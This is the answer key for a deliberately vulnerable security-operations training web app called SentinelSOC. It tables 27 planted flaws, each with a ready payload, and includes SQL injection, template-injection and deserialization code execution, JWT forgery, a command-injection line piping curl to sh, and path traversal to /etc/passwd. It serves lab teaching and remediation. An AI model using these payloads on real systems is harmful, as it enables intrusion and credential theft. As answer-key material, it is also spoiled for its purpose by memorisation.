# SentinelSOC — Solutions / Answer Key (SPOILERS)

Full list of the intended vulnerabilities, where they live and how to prove
impact. Realistic "prizes" (no CTF flags):

- Other analysts' PII, password **MD5** hashes, and **API tokens**
- Integration secrets in `settings`: `splunk_hec_token`, `virustotal_api_key`,
  `smtp_password`, `webhook_url`
- Env secret `INTERNAL_API_KEY = ik_live_9f3c7a2b1e8d4c6f_soc`
- Code execution as `root` in the container via **five** independent routes
- Arbitrary file read (`/etc/passwd`, `/app/app.py`)

Base URL below is `http://localhost:8084` (host). Inside the lab network the
container is reachable at `http://sentinelsoc:5004` (or `http://vuln-app5:5004`).

Demo accounts: `jdoe`/`spring-2024` (analyst), `admin`/`S0C-Adm!n-2024` (admin).

| # | Vulnerability | Where | Proof of concept |
|---|---------------|-------|------------------|
| 1 | **SQL Injection** | `/alerts?q=` & `?severity=`, `/hunt?q=`, `GET /api/search?q=` (all `... LIKE '%q%'`) | events table has 6 cols; `q=zzz%' UNION SELECT 1,'t','h','s','w',(SELECT value FROM settings WHERE key='splunk_hec_token')-- ` leaks the HEC token through the message column; pivot to `analysts` for hashes/api_tokens |
| 2 | **Reflected XSS** | `/alerts?q=` ("Results for …" echoed with `| safe`) | `q=<script>alert(1)</script>` |
| 3 | **Stored XSS** | case note → `/cases/<id>` | note body `<img src=x onerror=alert(1)>` |
| 4 | **Stored SSTI → RCE** | case notes **and** the shift banner, both via `render_template_string` | note `{{7*7}}`→49; `{{ cycler.__init__.__globals__.os.popen('id').read() }}`; read env `INTERNAL_API_KEY` |
| 5 | **Weak JWT secret** | `Authorization: Bearer` (HS256 key = `sentinel`) | crack/guess key → forge `{"role":"admin"}` |
| 6 | **JWT `alg:none`** | same | unsigned `{"alg":"none"}` token with `role:admin` is trusted |
| 7 | **Mass assignment (register)** | `POST /api/register` | `{"username":"x","password":"y","role":"admin"}` → instant admin analyst |
| 8 | **Mass assignment / BOLA (update)** | `PATCH /api/analysts/<id>` | any token edits ANY analyst incl. `role` → takeover + privesc |
| 9 | **IDOR — analysts** | `GET /api/analysts/<id>` | any token reads any analyst incl. `password` (MD5) + `api_token` + PII |
| 10 | **IDOR — alerts & cases** | `GET /api/alerts/<id>`, `GET /api/cases/<id>` | any token reads any record |
| 11 | **Broken access control (admin)** | `/api/admin/users`, `/api/admin/settings`, `/admin` | reachable after forging/escalating to `role:admin` |
| 12 | **OS Command Injection → RCE** | `GET /playbooks/<id>/run` (params fill a shell template) **and** `/api/admin/backup?name=` | playbook "Enrich & notify" → `indicator=127.0.0.1; id #`; backup `name=x; id #` → runs `id`; full RCE as root |
| 13 | **Path Traversal / LFI** | `GET /download?path=` | `path=../app.py`, `path=../../../../etc/passwd` |
| 14 | **Unrestricted file upload** | `POST /api/upload` (multipart `file`) | any type/name saved to `evidence/`; `filename=../app.py` overwrites source |
| 15 | **SSRF** | `GET /api/enrich?url=` and `GET /intel?ioc=` (urllib) | `url=file:///etc/passwd`, `url=http://169.254.169.254/…`, internal hosts/ports |
| 16 | **Insecure Deserialization → RCE** | `Cookie: remember=<base64(pickle)>` | parsed by `pickle.loads` in `before_request`; craft `__reduce__` → **unauthenticated RCE** |
| 17 | **Open Redirect** | `GET /go?next=`, `/login?next=` | `next=https://evil.example` |
| 18 | **CORS misconfiguration** | any response | reflects `Origin` into ACAO **with** `Allow-Credentials: true` |
| 19 | **Weak password hashing** | MD5, unsalted | `/api/analysts/<id>` returns MD5 `password`; crack offline |
| 20 | **Sensitive data exposure** | `settings` + analyst records | `splunk_hec_token`, `virustotal_api_key`, `smtp_password`, `webhook_url`, per-analyst `api_token` all leak via API/admin |
| 21 | **Security misconfiguration** | whole app | Flask `debug=True` (Werkzeug debugger + stack traces), no security headers, `Server:` banner |
| 22 | **User enumeration + no rate limiting** | `POST /api/login` | "No such analyst" vs "Wrong password"; unlimited attempts |
| 23 | **Weak Flask session secret** | session cookie signed with `sentinel` | known/guessable key → forge an admin session cookie offline |

### Advanced code-execution (multi-step chains)

The sinks look like ordinary SOC tooling (a triage score, a detection-rule
tester, a config restore, an integration loader). Each needs admin first, so the
realistic path is: forge an `alg:none` admin token (#6) **or** register
`{"role":"admin"}` (#7) **or** sign a `sentinel` JWT (#5) → then reach the sink.

| # | Vulnerability | Where | Proof of concept |
|---|---------------|-------|------------------|
| 24 | **Code injection via `eval()` (triage score)** | admin sets `risk_formula` via `POST /api/admin/settings`, evaluated in **public** `POST /api/triage/score` | set `risk_formula = __import__('os').popen('id').read()` → an unauthenticated score request returns `uid=0(root)…`. **RCE as root.** |
| 25 | **Code injection via `eval()` (detection rule)** | `POST /api/rules/test` (and stored rule `condition`s) — a *sandboxed* `eval` (`__builtins__` stripped) | sandbox is still escapable: `[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='Popen'][0](['touch','/tmp/pwn'])` → **RCE**. Harder: no builtins, needs a gadget. |
| 26 | **Unsafe YAML deserialization → RCE** | `POST /api/admin/config` (`yaml.load` with full `Loader`) | body `!!python/object/apply:os.system ['id']` → arbitrary object construction → **RCE**. |
| 27 | **Insecure integration loader (dynamic import) → RCE** | `POST /api/admin/integrations` (upload `.py`) + `GET /api/admin/integrations/run?name=` (`importlib.import_module`) | upload `pwn.py` with top-level `os.system('id')`, then run `?name=pwn` → import executes module code → **RCE**. Two-step chain. |

**Count: 27.** All verified firing against the shipped build (two independent
`eval` RCEs, plus command-injection, YAML, pickle and the plugin loader = **six
paths to code execution**, five of them as `root`).

### Notable chains
- `alg:none` **or** cracked `sentinel` secret → `/api/admin/settings` → steal the Splunk/VirusTotal/SMTP secrets and every analyst `api_token`.
- Stored case-note SSTI → RCE → `printenv INTERNAL_API_KEY`.
- `remember` cookie deserialization → RCE with **no account at all**.
- Privesc → set `risk_formula` (#24) → **public** `/api/triage/score` fires the payload → root.
- A playbook's "Enrich & notify" action (#12) runs `ping -c 1 {indicator}` → `indicator=1.1.1.1; curl …|sh` → root.
- Privesc → upload + import an "integration" (#27) → persistent RCE backdoor.

### The one-line fixes (for a "remediation" lesson)
Parameterize SQL · autoescape all output · `render_template` not
`render_template_string` on user data · verify JWT signatures & pin algorithms ·
per-object ownership checks · allow-list upload types & normalize paths ·
allow-list outbound URLs (SSRF) · never `pickle.loads` untrusted data · strong
random `SECRET_KEY` · uniform auth errors + rate limits · `debug=False` +
security headers · never `eval`/`exec` on config or user input (parse a real
grammar) · `yaml.safe_load` only · never `import_module` on attacker-controlled
names or load uploaded code · build shell commands with argument lists, never
string formatting.
